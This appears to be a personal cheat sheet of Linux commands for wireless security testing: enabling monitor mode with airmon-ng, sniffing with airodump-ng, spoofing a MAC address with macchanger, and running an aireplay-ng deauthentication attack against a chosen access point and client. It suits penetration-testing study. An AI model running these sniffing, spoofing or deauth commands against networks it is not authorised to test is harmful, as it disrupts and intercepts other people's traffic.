######## Security ########

## 1. Basic
ifconfig # 1.1 check network interface

iwconfig # 1.2 check wireless network interface
iwconfig wlan0 # 1.3 check wireless network interface

airmon-ng check # 1.4 check processes against Monitor mode
airmon-ng check kill # 1.5 kill processes against Moniter mode

## 2. switch modes between "Managed" and "Monitor"
sudo airmon-ng start wlan0 # 2.1.1 Monitor (tutorial)
sudo airmon-ng stop wlan0mon # 2.1.2 Managed (tutorial)

sudo ifconfig wlan0 down # 2.2.1 set interface down
ip link set wlan0 down # or 2.2.1 set interface down
sudo iwconfig wlan0 mode monitor # 2.2.2 set mode monitor
sudo iwconfig wlan0 mode managed # 2.2.3 set mode managed
sudo ifconfig wlan0 up # 2.2.4 set interface up
ip link set wlan0 up # or 2.2.4 set interface up

## 3. switch channels (interface must be up)
iw wlan0 set channel 6 HT40- #?? 3.1 set channel 6, width 40MHz

## 4. start network-manager
service network-manager start  # 4.1


#### sniff traffic ####
## 5. start wireshark
wireshark # 5.1

## 6. sniff directly
sudo airodump-ng wlan0 # 6.1
sudo airodump-ng --bssid xx:xx:xx:xx:xx:xx wlan0 --channel xx # 6.2 targeted sniff

## 7. change MAC
ifconfig wlan0 down # 7.1
macchanger -r wlan0 # 7.2 -r -> random MAC
ifconfig wlan0 up # 7.3

## 8. deauthentication/deauth atk
aireplay-ng --deauth 2000 -a xx:xx:xx:xx:xx:xx -c xx:xx:xx:xx:xx:xx wlan0 # 8.1 deauth, -a:access point MAC, -c:client MAC
